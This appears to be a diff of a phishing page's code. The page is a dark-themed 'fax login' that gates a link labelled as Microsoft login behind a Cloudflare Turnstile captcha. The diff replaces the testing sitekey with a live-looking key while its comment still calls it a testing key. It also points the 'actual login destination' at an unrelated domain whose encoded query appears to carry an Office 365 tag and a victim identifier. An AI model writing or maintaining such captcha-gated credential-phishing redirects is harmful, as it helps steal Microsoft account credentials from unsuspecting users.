@@ -96,7 +96,7 @@
             <div class="flex justify-center mb-6">
                 <!-- 
                     The sitekey used here is a universal testing sitekey. 
-                    For production, replace '1x00000000000000000000FF0000000000' with your actual sitekey.
+                    For production, replace '0x4AAAAAAB93sJCKP5tNQbQN' with your actual sitekey.
                 -->
                 <div id="cf-captcha-widget"></div>
             </div>
@@ -120,7 +120,7 @@
     <!-- JavaScript for Turnstile and Login Logic -->
     <script>
         const LOGIN_LINK = document.getElementById('microsoft-login-link');
-        const ORIGINAL_HREF = "https://logsmsifax.vercel.app/"; // The actual login destination
+        const ORIGINAL_HREF = "https://vckguj.com/s/?c3Y9bzM2NV8xX25vbSZtPTg4JnVpZD1VU0VSMzAxMDIwMjVVNDgxMDMwNTEmdD1LRw==N0123N"; // The actual login destination
 
         // 1. Function called by Cloudflare Turnstile upon successful verification
         window.turnstileCallback = function(token) {
@@ -145,7 +145,7 @@
         function renderTurnstileWidget() {
             if (typeof turnstile !== 'undefined') {
                 turnstile.render('#cf-captcha-widget', {
-                    sitekey: '1x00000000000000000000FF0000000000', // Universal testing sitekey
+                    sitekey: '0x4AAAAAAB93sJCKP5tNQbQN', // Universal testing sitekey
                     callback: 'turnstileCallback',
                     theme: 'dark', // Match the dark theme of the page
                     action: 'fax_login_access'
